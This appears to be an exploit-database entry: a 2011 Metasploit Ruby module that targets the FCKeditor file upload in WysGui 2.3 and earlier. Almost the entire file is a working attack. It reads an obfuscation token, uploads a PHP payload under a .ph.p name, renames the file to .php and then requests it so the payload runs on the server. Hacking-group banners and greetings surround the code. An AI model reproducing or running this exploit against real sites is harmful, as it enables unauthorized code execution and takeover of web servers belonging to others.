@@ -1,0 +1,224 @@
+id: 16208
+date: 05/29/2011
+title: WysGui <= 2.3 (FCKeditor) File Upload Code Execution (meta)
+author: KedAns-Dz
+cves: 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm KedAns-Dz member from Inj3ct0r Team                1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+##
+# WysGui <= 2.3 (FCKeditor) File Upload Code Execution (meta)
+# By KedAns-Dz
+# Platform : PHP
+##
+# $Id: wysgui_fcke.rb | 2011-05-29 01:31  | KedAns-Dz $ 
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'WysGui <= 2.3 (FCKeditor) File Upload Code Execution',
+			'Description'    => %q{
+					This module exploits a vulnerability in the FCK/CKeditor plugin.
+				By renaming the uploaded file this vulnerability can be used to upload/execute
+				code on the affected system.
+			},
+			'Author'         => [ 'KedAns-Dz <ked-h[at]1337day.com>' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '1.0',
+			'References'     =>
+				[
+					['URL', 'http://1337day.com/exploits/16011'],
+				],
+			'Privileged'     => false,
+			'Payload'        =>
+				{
+					'DisableNops' => true,
+					'Compat'      =>
+						{
+							'ConnectionType' => 'find',
+						},
+					'Space'       => 1024,
+				},
+			'Platform'       => 'php',
+			'Arch'           => ARCH_PHP,
+			'Targets'        => [[ 'Automatic', { }]],
+			'DisclosureDate' => '02/05/2011',
+			'DefaultTarget'  => 0))
+
+			register_options(
+				[
+					OptString.new('URI', [true, "WysGui directory path", "/"]),
+				], self.class)
+	end
+
+	def check
+		uri = ''
+		uri << datastore['URI']
+		uri << '/' if uri[-1,1] != '/'
+		uri << 'fckeditor/editor/filemanager/connectors/php/upload.php?Type=File'
+		res = send_request_raw(
+			{
+				'uri' => uri
+			}, 25)
+
+		if (res and res.body =~ /sample16.swf/)
+			return Exploit::CheckCode::Vulnerable
+		end
+
+		return Exploit::CheckCode::Safe
+	end
+
+
+	def retrieve_obfuscation()
+
+	end
+
+
+	def exploit
+
+		cmd_php = '<?php ' + payload.encoded + '?>'
+
+		# Generate some random strings
+		cmdscript	= rand_text_alpha_lower(20)
+		boundary    = rand_text_alphanumeric(6)
+
+		# Static files
+		directory 	= '/fckeditor/editor/images'
+		uri_base    = ''
+		uri_base << datastore['URI']
+		uri_base << '/' if uri_base[-1,1] != '/'
+		uri_base << 'fckeditor/editor/filemanager/connectors/php'
+
+		# Get obfuscation code (needed to upload files)
+		obfuscation_code = nil
+
+		res = send_request_raw({
+			'uri'     => uri_base + '/upload.php?Type=File'
+		}, 25)
+
+		if (res)
+
+			if(res.body =~ /"obfus", "((\w)+)"\)/)
+				obfuscation_code = $1
+				print_status("Successfully retrieved obfuscation code: #{obfuscation_code}")
+			else
+				print_error("Error retrieving obfuscation code!")
+				return
+			end
+		end
+
+
+
+		# Upload shellcode (file ending .ph.p)
+		data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"Filename\"\r\n\r\n"
+		data << "#{cmdscript}.ph.p\r\n--#{boundary}"
+		data << "\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"#{cmdscript}.ph.p\"\r\n"
+		data << "Content-Type: application/octet-stream\r\n\r\n"
+		data << cmd_php
+		data << "\r\n--#{boundary}--"
+
+		res = send_request_raw({
+			'uri'	  => uri_base + "/connector.php?Command=FileUpload&Type=File&CurrentFolder=" + directory + "&obfuscate=#{obfuscation_code}",
+			'method'  => 'POST',
+			'data'    => data,
+			'headers' =>
+			{
+				'Content-Length' => data.length,
+				'Content-Type'	 => 'multipart/form-data; boundary=' + boundary,
+			}
+		}, 25)
+
+		if (res and res.body =~ /File Upload Success/)
+			print_status("Successfully uploaded #{cmdscript}.ph.p")
+		else
+			print_error("Error uploading #{cmdscript}.ph.p")
+		end
+
+
+		# Complete the upload process (rename file)
+		print_status("Renaming file from #{cmdscript}.ph.p_ to #{cmdscript}.ph.p")
+		res = send_request_raw({
+			'uri'     => uri_base + '/connector.php?Command=FileUpload&Type=File&CurrentFolder=' + directory + '&filetotal=1'
+		})
+
+
+		# Rename the file from .ph.p to .php
+		res = send_request_cgi(
+			{
+				'method'    => 'POST',
+				'uri'       => uri_base + '/connector.php?Command=Edit&Type=File&CurrentFolder=',
+				'vars_post' =>
+				{
+					'actionfile[0]' => "#{cmdscript}.ph.p",
+					'renameext[0]'   => 'p',
+					'renamefile[0]' => "#{cmdscript}.ph",
+					'sortby' => 'name',
+					'sorttype' => 'asc',
+					'showpage' => '0',
+					'action' => 'rename',
+					'commit' => '',
+				}
+			}, 10)
+
+		if (res and res.body =~ /successfully renamed./)
+			print_status ("Renamed #{cmdscript}.ph.p to #{cmdscript}.php")
+		else
+			print_error("Failed to rename #{cmdscript}.ph.p to #{cmdscript}.php")
+		end
+
+
+		# Finally call the payload
+		print_status("Calling payload: #{cmdscript}.php")
+		uri = ''
+		uri << datastore['URI']
+		uri << '/' if uri[-1,1] != '/'
+		uri << directory + cmdscript + ".php"
+		res = send_request_raw({
+			'uri'	=> uri
+		}, 25)
+
+	end
+
+end
+
+#================[ Exploited By KedAns-Dz * HST-Dz * ]===========================================  
+# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS > Islampard + Z4k1-X-EnG + Dr.Ride
+# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (www.1337day.com) 
+# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * eidelweiss * SeeMe * XroGuE * ZoRLu
+# gunslinger_ * Sn!pEr.S!Te * anT!-Tr0J4n * ^Xecuti0N3r 'www.1337day.com/team' ++ .... * Str0ke
+# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * TreX (hotturks.org)
+# JaGo-Dz (sec4ever.com) * CEO (0nto.me) * PaCketStorm Team (www.packetstormsecurity.org)
+# www.metasploit.com * UE-Team (www.09exploit.com) * All Security and Exploits Webs ...
+# -+-+-+-+-+-+-+-+-+-+-+-+={ Greetings to Friendly Teams : }=+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+# (D) HaCkerS-StreeT-Team (Z) | Inj3ct0r | Exploit-ID | UE-Team | PaCket.Storm.Sec TM | Sec4Ever 
+# h4x0re-Sec | Dz-Ghost | INDONESIAN CODER | HotTurks | IndiShell | D.N.A | DZ Team | Milw0rm
+# Indian Cyber Army | MetaSploit | BaCk-TraCk | AutoSec.Tools | HighTech.Bridge SA | Team DoS-Dz
+#================================================================================================
+
+
+
+#  0day.today [2023-03-22]  #
